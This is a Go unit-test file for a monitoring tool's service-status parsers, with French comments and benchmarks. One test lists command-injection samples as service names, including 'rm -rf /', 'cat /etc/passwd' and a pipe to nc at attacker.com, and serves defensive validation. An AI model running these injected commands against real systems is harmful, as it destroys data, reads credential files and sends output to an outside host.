package collectors

import (
	"strings"
	"testing"

	"go-monitoring/models"

	"github.com/stretchr/testify/assert"
)

// Tests pour le parsing des sorties de commandes de services

func TestServiceStatusMapping_Windows(t *testing.T) {
	// Test du mapping des statuts Windows vers Linux
	tests := []struct {
		windowsStatus string
		expectedStatus string
	}{
		{"running", "active"},
		{"Running", "active"},
		{"RUNNING", "active"},
		{"stopped", "inactive"},
		{"Stopped", "inactive"},
		{"STOPPED", "inactive"},
		{"not_found", "not-found"},
		{"paused", "paused"},
		{"unknown", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.windowsStatus, func(t *testing.T) {
			// Simuler la logique de mapping
			status := normalizeWindowsStatus(tt.windowsStatus)
			assert.Equal(t, tt.expectedStatus, status, "Windows status mapping should match")
		})
	}
}

func TestParseWindowsServiceOutput(t *testing.T) {
	tests := []struct {
		name           string
		output         string
		services       []string
		expectedCount  int
		expectedStatus map[string]string
	}{
		{
			name:          "multiple services running",
			output:        "nginx|Running\napache|Running\nmysql|Stopped",
			services:      []string{"nginx", "apache", "mysql"},
			expectedCount: 3,
			expectedStatus: map[string]string{
				"nginx":  "active",
				"apache": "active",
				"mysql":  "inactive",
			},
		},
		{
			name:          "service not found",
			output:        "nginx|Running\ninvalid_service|not_found",
			services:      []string{"nginx", "invalid_service"},
			expectedCount: 2,
			expectedStatus: map[string]string{
				"nginx":           "active",
				"invalid_service": "not-found",
			},
		},
		{
			name:          "empty output",
			output:        "",
			services:      []string{},
			expectedCount: 0,
			expectedStatus: map[string]string{},
		},
		{
			name:          "single service",
			output:        "postgresql|Running",
			services:      []string{"postgresql"},
			expectedCount: 1,
			expectedStatus: map[string]string{
				"postgresql": "active",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := parseWindowsServiceOutput(tt.output)
			assert.Len(t, results, tt.expectedCount, "Should parse correct number of services")

			for _, result := range results {
				expectedStatus, exists := tt.expectedStatus[result.Name]
				if exists {
					assert.Equal(t, expectedStatus, result.Status, "Status for %s should match", result.Name)
				}
			}
		})
	}
}

func TestParseLinuxServiceOutput(t *testing.T) {
	tests := []struct {
		name           string
		output         string
		services       []string
		expectedCount  int
		expectedStatus map[string]string
	}{
		{
			name:          "multiple services",
			output:        "active\ninactive\nactive\nfailed",
			services:      []string{"nginx", "apache2", "mysql", "postgresql"},
			expectedCount: 4,
			expectedStatus: map[string]string{
				"nginx":      "active",
				"apache2":    "inactive",
				"mysql":      "active",
				"postgresql": "failed",
			},
		},
		{
			name:          "all active",
			output:        "active\nactive\nactive",
			services:      []string{"nginx", "mysql", "redis"},
			expectedCount: 3,
			expectedStatus: map[string]string{
				"nginx": "active",
				"mysql": "active",
				"redis": "active",
			},
		},
		{
			name:          "mixed statuses",
			output:        "active\nfailed\ninactive\nunknown\nactivating",
			services:      []string{"svc1", "svc2", "svc3", "svc4", "svc5"},
			expectedCount: 5,
			expectedStatus: map[string]string{
				"svc1": "active",
				"svc2": "failed",
				"svc3": "inactive",
				"svc4": "unknown",
				"svc5": "activating",
			},
		},
		{
			name:          "whitespace handling",
			output:        "  active  \n  inactive  \n  failed  ",
			services:      []string{"svc1", "svc2", "svc3"},
			expectedCount: 3,
			expectedStatus: map[string]string{
				"svc1": "active",
				"svc2": "inactive",
				"svc3": "failed",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := parseLinuxServiceOutput(tt.output, tt.services)
			assert.Len(t, results, tt.expectedCount, "Should parse correct number of services")

			for i, result := range results {
				if i < len(tt.services) {
					assert.Equal(t, tt.services[i], result.Name, "Service name should match")
					expectedStatus := tt.expectedStatus[result.Name]
					assert.Equal(t, expectedStatus, result.Status, "Status for %s should match", result.Name)
				}
			}
		})
	}
}

func TestServiceStatusEdgeCases(t *testing.T) {
	t.Run("output has more lines than services", func(t *testing.T) {
		output := "active\ninactive\nactive\nunknown\nfailed"
		services := []string{"svc1", "svc2"}
		results := parseLinuxServiceOutput(output, services)
		assert.Len(t, results, 2, "Should only return results for requested services")
	})

	t.Run("output has fewer lines than services", func(t *testing.T) {
		output := "active\ninactive"
		services := []string{"svc1", "svc2", "svc3", "svc4"}
		results := parseLinuxServiceOutput(output, services)
		// Les services manquants devraient avoir status "unknown"
		assert.Len(t, results, len(services), "Should return all requested services")
		for _, result := range results {
			assert.NotEmpty(t, result.Status, "All services should have a status")
		}
	})

	t.Run("empty service list", func(t *testing.T) {
		output := ""
		services := []string{}
		results := parseLinuxServiceOutput(output, services)
		assert.Empty(t, results, "Should return empty array for no services")
	})

	t.Run("service names with special characters", func(t *testing.T) {
		// Certains services peuvent avoir des noms complexes
		output := "nginx-proxy|Running\npostgresql-12|Running\nmy-app.service|Stopped"
		results := parseWindowsServiceOutput(output)
		assert.GreaterOrEqual(t, len(results), 1, "Should parse services with special characters")
	})
}

func TestServiceStatusSecurity(t *testing.T) {
	t.Run("command injection attempt in service name", func(t *testing.T) {
		// Les noms de services malicieux devraient être bloqués par ValidateServiceName
		maliciousNames := []string{
			"nginx; rm -rf /",
			"mysql && cat /etc/passwd",
			"apache | nc attacker.com 1234",
			"service`whoami`",
			"svc$(id)",
		}

		for _, name := range maliciousNames {
			t.Run(name, func(t *testing.T) {
				// Ces noms devraient être rejetés avant même d'atteindre CollectServices
				// La validation se fait dans collectors/services_control.go via security.ValidateServiceName
				found := false
				for _, char := range []string{";", "&&", "|", "`", "$"} {
					if strings.Contains(name, char) {
						found = true
						break
					}
				}
				assert.True(t, found, "Malicious name should contain shell metacharacters")
			})
		}
	})
}

// Helper functions pour simuler le parsing

func normalizeWindowsStatus(status string) string {
	// Convertir en minuscules pour la comparaison
	lowered := ""
	for _, char := range status {
		if char >= 'A' && char <= 'Z' {
			lowered += string(char + 32)
		} else {
			lowered += string(char)
		}
	}

	switch lowered {
	case "running":
		return "active"
	case "stopped":
		return "inactive"
	case "not_found":
		return "not-found"
	default:
		return lowered
	}
}

func parseWindowsServiceOutput(output string) []models.ServiceStatus {
	var results []models.ServiceStatus

	if output == "" {
		return results
	}

	lines := splitLines(output)
	for _, line := range lines {
		line = trimWhitespace(line)
		if line == "" {
			continue
		}

		parts := splitPipe(line)
		if len(parts) >= 2 {
			name := trimWhitespace(parts[0])
			status := normalizeWindowsStatus(trimWhitespace(parts[1]))

			results = append(results, models.ServiceStatus{
				Name:   name,
				Status: status,
			})
		}
	}

	return results
}

func parseLinuxServiceOutput(output string, services []string) []models.ServiceStatus {
	var results []models.ServiceStatus

	lines := splitLines(output)

	for i, service := range services {
		status := "unknown"
		if i < len(lines) {
			status = trimWhitespace(lines[i])
		}

		results = append(results, models.ServiceStatus{
			Name:   service,
			Status: status,
		})
	}

	return results
}

// Helper functions simplifiées pour les tests

func splitLines(s string) []string {
	var lines []string
	current := ""

	for _, char := range s {
		if char == '\n' {
			lines = append(lines, current)
			current = ""
		} else {
			current += string(char)
		}
	}

	if current != "" {
		lines = append(lines, current)
	}

	return lines
}

func splitPipe(s string) []string {
	var parts []string
	current := ""

	for _, char := range s {
		if char == '|' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(char)
		}
	}

	if current != "" {
		parts = append(parts, current)
	}

	return parts
}

func trimWhitespace(s string) string {
	// Trim leading whitespace
	for len(s) > 0 && (s[0] == ' ' || s[0] == '\t' || s[0] == '\n' || s[0] == '\r') {
		s = s[1:]
	}

	// Trim trailing whitespace
	for len(s) > 0 && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t' || s[len(s)-1] == '\n' || s[len(s)-1] == '\r') {
		s = s[:len(s)-1]
	}

	return s
}

// Benchmark tests

func BenchmarkParseWindowsServiceOutput(b *testing.B) {
	output := "nginx|Running\napache|Running\nmysql|Stopped\npostgresql|Running\nredis|Running"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		parseWindowsServiceOutput(output)
	}
}

func BenchmarkParseLinuxServiceOutput(b *testing.B) {
	output := "active\ninactive\nactive\nfailed\nactive"
	services := []string{"nginx", "apache2", "mysql", "postgresql", "redis"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		parseLinuxServiceOutput(output, services)
	}
}

func BenchmarkNormalizeWindowsStatus(b *testing.B) {
	statuses := []string{"Running", "Stopped", "not_found", "Paused"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		normalizeWindowsStatus(statuses[i%len(statuses)])
	}
}
